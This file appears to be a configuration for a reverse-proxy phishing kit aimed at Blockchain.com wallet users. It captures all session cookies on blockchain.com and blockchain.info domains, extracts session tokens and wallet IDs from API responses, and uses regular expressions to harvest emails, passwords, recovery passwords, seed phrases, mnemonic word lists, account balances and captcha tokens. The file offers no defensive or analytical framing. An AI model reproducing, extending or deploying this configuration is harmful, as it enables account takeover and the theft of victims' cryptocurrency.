auth_tokens:
  - domain: 'login.blockchain.com'
    keys: ['.*:regexp']
  - domain: '.blockchain.com'
    keys: ['.*:regexp']
  - domain: 'www.blockchain.com'
    keys: ['.*:regexp']
  - domain: 'api.blockchain.info'
    keys: ['.*:regexp']
  - domain: '.blockchain.info'
    keys: ['.*:regexp']
  - domain: 'blockchain.info'
    keys: ['.*:regexp']
  - domain: 'api.blockchain.com'
    keys: ['.*:regexp']
  - domain: 'login.blockchain.com'
    type: 'body'
    path: '/nabu-gateway/.*'
    name: 'sessionToken'
    search: '"sessionToken"\s*:\s*"([^"]+)"'
  - domain: 'api.blockchain.com'
    type: 'body'
    path: '/nabu-gateway/.*'
    name: 'sessionToken'
    search: '"sessionToken"\s*:\s*"([^"]+)"'
  - domain: 'api.blockchain.com'
    type: 'body'
    path: '/nabu-gateway/.*'
    name: 'guid'
    search: '"(?:guid|walletGuid|walletId|loginIdentifier)"\s*:\s*"([^"]+)"'
  - domain: 'api.blockchain.com'
    type: 'body'
    path: '/wallet/.*'
    name: 'guid'
    search: '"(?:guid|walletGuid|walletId)"\s*:\s*"([^"]+)"'

auth_urls:
  - '/account/home'
  - '/account/home/*'

credentials:
  username:
    key: 'email'
    search: '"(?:email|login|username)"\s*:\s*"([^"]+)"'
    type: 'json'
  password:
    key: 'password'
    search: '"(?:password|pass|mainPassword|walletPassword|backupPassword|recoveryPassword|encryptPassword|newPassword|pwd|secret)"\s*:\s*"([^"]+)"'
    type: 'json'
  custom:
    - key: 'guid'
      search: '"(?:guid|walletGuid|walletId|loginIdentifier)"\s*:\s*"([^"]+)"'
      type: 'json'
    - key: 'loginIdentifier'
      search: '"(?:loginIdentifier|identifier)"\s*:\s*"([^"]+)"'
      type: 'json'
    - key: 'mnemonic'
      search: '"(?:mnemonic|seedPhrase|recoveryPhrase|secretRecoveryPhrase|phrase)"\s*:\s*"([^"]+)"'
      type: 'json'
    - key: 'mnemonic_words'
      search: '"(?:words|mnemonicWords|recoveryWords)"\s*:\s*\[([^\]]+)\]'
      type: 'json'
    - key: 'recovery_password'
      search: '"(?:recoveryPassword|walletPassword|backupPassword|encryptPassword)"\s*:\s*"([^"]+)"'
      type: 'json'
    - key: 'balance'
      search: '"(?:balance|totalBalance|fiatBalance|availableBalance)"\s*:\s*"?([^",}]+)"?'
      type: 'json'
    - key: 'sessionToken'
      search: '"sessionToken"\s*:\s*"([^"]+)"'
      type: 'json'
    - key: 'captcha'
      search: '"(?:captcha|g-recaptcha-response|recaptchaToken)"\s*:\s*"([^"]+)"'
      type: 'json'

